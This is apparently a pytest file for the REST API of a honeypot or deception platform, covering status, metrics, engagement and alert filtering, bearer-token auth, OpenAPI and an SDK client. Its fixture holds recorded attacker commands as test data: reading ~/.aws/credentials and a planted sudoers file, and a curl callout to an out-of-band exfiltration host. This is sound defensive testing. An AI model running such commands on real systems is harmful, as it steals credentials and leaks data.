"""Tests for the inbound REST API.

We test the FastAPI app in-process via httpx.AsyncClient + ASGITransport
(no real socket, no uvicorn). Four layers:

  1. Status endpoints (health/ready/version) — open, no auth.
  2. Read endpoints (engagements/alerts) — auth-gated when configured.
  3. Action endpoints (mfa decisions, isolation probe) — auth-gated.
  4. Auth middleware — Bearer-token enforcement.
  5. OpenAPI surface — schema is generated, has the expected paths.
  6. SDK round-trip — PlenithClient hits the app, gets typed data back.
"""
from __future__ import annotations

import json
import time
from pathlib import Path
from typing import Any, Dict, List

import httpx
import pytest

from fastapi.testclient import TestClient

from plenith.api import build_app
from plenith.api.auth import APIAuth
from plenith.api.client import PlenithClient
from plenith.api.metrics import render_metrics


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture
def state_dirs(tmp_path):
    """Build a synthetic engagement-state tree the API can read."""
    state_dir = tmp_path / "state" / "persistence"
    logs_dir  = tmp_path / "state" / "logs"
    personas  = tmp_path / "personas"
    (state_dir).mkdir(parents=True)
    (logs_dir / "bastion-prod").mkdir(parents=True)
    personas.mkdir()

    # Persona file (minimal — audit walks this dir)
    (personas / "jdoe.yaml").write_text(
        "username: jdoe\nhostname: bastion-prod\nfull_name: J. Doe\n"
        "home: /home/jdoe\nshell: /bin/bash\nuid: 1001\ngroups: [jdoe]\n",
        encoding="utf-8",
    )

    # State file
    now = time.time()
    eng = {
        "engagement_id": "abc12345-0000-0000-0000-000000000001",
        "claimed_user":  "jdoe",
        "source_ip":     "192.0.2.99",
        "persona":       "jdoe",
        "first_seen_at": now - 60,
        "last_seen_at":  now,
        "connection_count": 2,
        "cwd":           "/home/jdoe",
        "observed":      {
            "ran_sudo": True,
            "credential_files_read": ["/home/jdoe/.aws/credentials"],
            "decoys_planted":  ["/etc/sudoers.d/zzz_compat"],
            "decoys_swallowed": ["/etc/sudoers.d/zzz_compat"],
            "dns_exfil_commands": ["curl https://x.oast.live/foo"],
            "attacker_likely_llm": True,
            "attacker_llm_confidence": 0.78,
        },
    }
    (state_dir / "192.0.2.99__jdoe.json").write_text(
        json.dumps(eng), encoding="utf-8",
    )

    # Log file with actions_taken
    log = {
        "engagement_id":   eng["engagement_id"],
        "claimed_user":    "jdoe",
        "source_ip":       "192.0.2.99",
        "actions_taken": [
            {"action": "alert_credential_exfil", "severity": "high",
             "rationale": "Attacker read planted ~/.aws/credentials",
             "ts_offset_s": 12.5, "triggered_by": "cat ~/.aws/credentials"},
            {"action": "alert_dns_exfil", "severity": "high",
             "rationale": "Curl to x.oast.live", "ts_offset_s": 30.1,
             "triggered_by": "curl https://x.oast.live/foo"},
            {"action": "alert_decoy_swallowed", "severity": "medium",
             "rationale": "Attacker read planted sudoers",
             "ts_offset_s": 45.0, "triggered_by": "cat /etc/sudoers.d/zzz_compat"},
        ],
        "commands": [
            {"cmd": "whoami"}, {"cmd": "id"},
            {"cmd": "cat ~/.aws/credentials"},
            {"cmd": "cat /etc/sudoers.d/zzz_compat"},
        ],
    }
    (logs_dir / "bastion-prod" / f"{int(now)}.json").write_text(
        json.dumps(log), encoding="utf-8",
    )
    return {"state_dir": state_dir, "logs_dir": logs_dir,
             "personas_dir": personas}


@pytest.fixture
def app_no_auth(state_dirs):
    """API with no auth (open mode — dev default)."""
    return build_app(cfg={}, **state_dirs)


@pytest.fixture
def app_with_auth(state_dirs):
    """API with Bearer auth enabled, valid tokens = {'test-token'}."""
    return build_app(
        cfg={"api": {"tokens": ["test-token", "second-token"]}},
        **state_dirs,
    )


@pytest.fixture
def client_open(app_no_auth):
    return TestClient(app_no_auth)


@pytest.fixture
def client_auth(app_with_auth):
    return TestClient(app_with_auth)


# ---------------------------------------------------------------------------
# Status endpoints — no auth required
# ---------------------------------------------------------------------------

class TestStatusEndpoints:
    def test_health(self, client_open):
        r = client_open.get("/health")
        assert r.status_code == 200
        assert r.json() == {"status": "ok"}

    def test_ready_reports_components(self, client_open):
        r = client_open.get("/ready")
        assert r.status_code == 200
        body = r.json()
        assert body["status"] in ("ready", "degraded", "starting")
        assert "components" in body
        assert "state_dir" in body["components"]

    def test_version_has_required_fields(self, client_open):
        r = client_open.get("/version")
        assert r.status_code == 200
        body = r.json()
        assert "version" in body
        assert body["api_version"] == "v1"
        assert "policy_engine" in body

    def test_health_open_when_auth_disabled(self, client_open):
        # /health is intentionally always reachable
        assert client_open.get("/health").status_code == 200

    def test_health_open_even_when_auth_enabled(self, client_auth):
        # Liveness probes must not require auth (k8s/load-balancers)
        assert client_auth.get("/health").status_code == 200


# ---------------------------------------------------------------------------
# Metrics endpoint
# ---------------------------------------------------------------------------

class TestMetrics:
    def test_metrics_text_format(self, client_open):
        r = client_open.get("/metrics")
        assert r.status_code == 200
        body = r.text
        assert "plenith_process_uptime_seconds" in body
        assert "plenith_engagements_total" in body
        # Severity labels present (alphabetical doesn't matter; just that one shows)
        assert 'severity="high"' in body
        assert "plenith_alerts_total" in body

    def test_render_metrics_alone(self):
        snap = {
            "engagement_count": 7,
            "alerts_total_by_severity": {"critical": 1, "high": 4},
            "alerts_total_by_action":   {"alert_credential_exfil": 3},
            "counter_ai_detections":    2,
            "counter_ai_proven_via_trap": 1,
            "mfa_decisions":            {"pass": 5, "fail": 1},
            "api_request_count":        100,
            "api_error_count":          3,
        }
        out = render_metrics(snap)
        assert "plenith_engagements_total 7" in out
        assert 'severity="critical"' in out
        assert "plenith_counter_ai_proven_total 1" in out
        assert "plenith_api_requests_total 100" in out


# ---------------------------------------------------------------------------
# Engagements (read endpoints)
# ---------------------------------------------------------------------------

class TestEngagementEndpoints:
    def test_list_returns_synthetic_engagement(self, client_open):
        r = client_open.get("/engagements")
        assert r.status_code == 200
        body = r.json()
        assert body["total"] >= 1
        # Severity max should be "high" (we set 2× high alerts)
        first = body["engagements"][0]
        assert first["severity_max"] == "high"
        assert first["alert_count"] == 3
        assert first["counter_ai_confidence"] == 0.78

    def test_filter_by_user(self, client_open):
        r = client_open.get("/engagements?user=jdoe")
        assert r.status_code == 200
        assert r.json()["total"] >= 1
        r = client_open.get("/engagements?user=nobody")
        assert r.json()["total"] == 0

    def test_filter_by_severity_threshold(self, client_open):
        # Our engagement has severity_max=high → matches severity=high
        r = client_open.get("/engagements?severity=high")
        assert r.json()["total"] >= 1
        # Filter to critical-only → no match
        r = client_open.get("/engagements?severity=critical")
        assert r.json()["total"] == 0

    def test_filter_by_since_seconds(self, client_open):
        # Engagement was created within the last minute → matches
        assert client_open.get("/engagements?since_seconds=300").json()["total"] >= 1
        # Now filter to 1 second window → too small
        assert client_open.get("/engagements?since_seconds=0").json()["total"] == 0

    def test_detail_by_prefix(self, client_open):
        r = client_open.get("/engagements/abc12345")
        assert r.status_code == 200
        body = r.json()
        assert body["engagement_id"].startswith("abc12345")
        assert body["claimed_user"] == "jdoe"
        # IoCs aggregated
        assert "/home/jdoe/.aws/credentials" in body["iocs_extracted"]

    def test_detail_unknown_returns_404(self, client_open):
        assert client_open.get("/engagements/zzz_nope").status_code == 404


# ---------------------------------------------------------------------------
# Alerts (read endpoint)
# ---------------------------------------------------------------------------

class TestAlertEndpoint:
    def test_lists_all_actions(self, client_open):
        r = client_open.get("/alerts")
        assert r.status_code == 200
        body = r.json()
        actions = {a["action"] for a in body["alerts"]}
        assert {"alert_credential_exfil", "alert_dns_exfil",
                 "alert_decoy_swallowed"}.issubset(actions)

    def test_filter_by_action(self, client_open):
        r = client_open.get("/alerts?action=alert_dns_exfil")
        body = r.json()
        assert all(a["action"] == "alert_dns_exfil" for a in body["alerts"])
        assert body["total"] >= 1

    def test_filter_by_severity(self, client_open):
        # severity=high keeps only high+critical
        r = client_open.get("/alerts?severity=high")
        body = r.json()
        for a in body["alerts"]:
            assert a["severity"] in ("critical", "high")

    def test_filter_by_engagement_prefix(self, client_open):
        r = client_open.get("/alerts?engagement_id=abc12345")
        assert r.json()["total"] >= 1


# ---------------------------------------------------------------------------
# Actions
# ---------------------------------------------------------------------------

class TestMFADecision:
    def test_writes_pass_decision(self, client_open, tmp_path, monkeypatch):
        # The handler writes to state-docker/mfa/ relative to repo root.
        # Patch the path resolution at the file-system layer.
        repo_root = Path(__file__).resolve().parent.parent
        target = repo_root / "state-docker" / "mfa"
        # Pre-clean any stale entry for our test IP
        for f in list(target.glob("198.51.100.42.*")) if target.exists() else []:
            f.unlink(missing_ok=True)

        r = client_open.post("/mfa/decisions/198.51.100.42",
                              json={"decision": "pass", "reason": "test"})
        assert r.status_code == 200
        body = r.json()
        assert body["ip"] == "198.51.100.42"
        assert body["decision"] == "pass"
        path = Path(body["path"])
        assert path.exists()
        text = path.read_text(encoding="utf-8")
        assert "ip=198.51.100.42" in text
        assert "decision=pass" in text
        # Cleanup
        path.unlink(missing_ok=True)

    def test_rejects_invalid_decision(self, client_open):
        r = client_open.post("/mfa/decisions/1.1.1.1",
                              json={"decision": "maybe"})
        assert r.status_code == 400


# ---------------------------------------------------------------------------
# Policy + content
# ---------------------------------------------------------------------------

class TestPolicyAndContent:
    def test_policy_endpoint(self, client_open):
        r = client_open.get("/policy")
        assert r.status_code == 200
        body = r.json()
        assert body["engine"] in ("heuristic", "rl", "trained_rl")
        assert body["n_actions"] >= 15

    def test_content_manifest_disabled_by_default(self, client_open):
        r = client_open.get("/content/manifest")
        assert r.status_code == 200
        assert r.json()["enabled"] is False


# ---------------------------------------------------------------------------
# Auth middleware
# ---------------------------------------------------------------------------

class TestAuth:
    def test_no_auth_means_open(self, client_open):
        # With no tokens configured, /engagements is reachable
        assert client_open.get("/engagements").status_code == 200

    def test_auth_required_when_configured(self, client_auth):
        # /engagements requires Bearer
        assert client_auth.get("/engagements").status_code == 401

    def test_valid_token_passes(self, client_auth):
        r = client_auth.get("/engagements",
                             headers={"Authorization": "Bearer test-token"})
        assert r.status_code == 200

    def test_invalid_token_rejected(self, client_auth):
        r = client_auth.get("/engagements",
                             headers={"Authorization": "Bearer wrong-token"})
        assert r.status_code == 401

    def test_second_valid_token_also_passes(self, client_auth):
        # Multiple valid tokens supported (rotate without service restart)
        r = client_auth.get("/engagements",
                             headers={"Authorization": "Bearer second-token"})
        assert r.status_code == 200

    def test_health_remains_open_when_auth_on(self, client_auth):
        assert client_auth.get("/health").status_code == 200
        assert client_auth.get("/ready").status_code == 200
        assert client_auth.get("/metrics").status_code == 200

    def test_apiauth_from_env(self, monkeypatch):
        monkeypatch.setenv("PLENITH_API_TOKENS", "env-tok-1, env-tok-2 ")
        auth = APIAuth.from_config(None)
        assert auth.enabled
        assert "env-tok-1" in auth._tokens
        assert "env-tok-2" in auth._tokens

    def test_apiauth_token_file(self, tmp_path):
        f = tmp_path / "tokens.txt"
        f.write_text("# comment\nfile-token-a\n\nfile-token-b\n",
                      encoding="utf-8")
        auth = APIAuth.from_config({"api": {"token_file": str(f)}})
        assert "file-token-a" in auth._tokens
        assert "file-token-b" in auth._tokens
        # Comment line skipped
        assert "# comment" not in auth._tokens


# ---------------------------------------------------------------------------
# OpenAPI schema
# ---------------------------------------------------------------------------

class TestOpenAPI:
    def test_schema_is_generated(self, client_open):
        r = client_open.get("/openapi.json")
        assert r.status_code == 200
        schema = r.json()
        assert schema["info"]["title"] == "Plenith API"
        # All major endpoint groups present
        paths = schema["paths"]
        for p in ("/health", "/ready", "/version", "/metrics",
                  "/engagements", "/engagements/{engagement_id}",
                  "/alerts", "/policy", "/content/manifest",
                  "/mfa/decisions/{ip}"):
            assert p in paths, f"missing path: {p}"

    def test_docs_ui_reachable(self, client_open):
        # FastAPI serves Swagger UI at /docs
        r = client_open.get("/docs")
        assert r.status_code == 200
        assert "swagger" in r.text.lower()

    def test_redoc_ui_reachable(self, client_open):
        r = client_open.get("/redoc")
        assert r.status_code == 200


# ---------------------------------------------------------------------------
# SDK round-trip — use httpx.ASGITransport so PlenithClient hits the
# in-memory app rather than a real socket.
# ---------------------------------------------------------------------------

class TestSDKRoundTrip:
    @pytest.mark.asyncio
    async def test_health(self, app_no_auth):
        async with httpx.AsyncClient(
            transport=httpx.ASGITransport(app=app_no_auth),
            base_url="http://testserver",
        ) as http:
            c = PlenithClient("http://testserver")
            c._client = http
            r = await c.health()
            assert r["status"] == "ok"

    @pytest.mark.asyncio
    async def test_list_engagements_typed(self, app_no_auth):
        async with httpx.AsyncClient(
            transport=httpx.ASGITransport(app=app_no_auth),
            base_url="http://testserver",
        ) as http:
            c = PlenithClient("http://testserver")
            c._client = http
            engs = await c.list_engagements(severity="high")
            assert engs
            assert engs[0]["claimed_user"] == "jdoe"
            assert engs[0]["severity_max"] == "high"

    @pytest.mark.asyncio
    async def test_mfa_decide(self, app_no_auth):
        async with httpx.AsyncClient(
            transport=httpx.ASGITransport(app=app_no_auth),
            base_url="http://testserver",
        ) as http:
            c = PlenithClient("http://testserver")
            c._client = http
            r = await c.write_mfa_decision("203.0.113.7", "fail",
                                              reason="sdk test")
            assert r["written"] is True
            # Clean up
            path = Path(r["path"])
            path.unlink(missing_ok=True)

    @pytest.mark.asyncio
    async def test_invalid_decision_raises(self, app_no_auth):
        c = PlenithClient("http://testserver")
        with pytest.raises(ValueError):
            await c.write_mfa_decision("1.1.1.1", "yes")

    @pytest.mark.asyncio
    async def test_openapi_via_sdk(self, app_no_auth):
        async with httpx.AsyncClient(
            transport=httpx.ASGITransport(app=app_no_auth),
            base_url="http://testserver",
        ) as http:
            c = PlenithClient("http://testserver")
            c._client = http
            schema = await c.openapi()
            assert schema["info"]["title"] == "Plenith API"
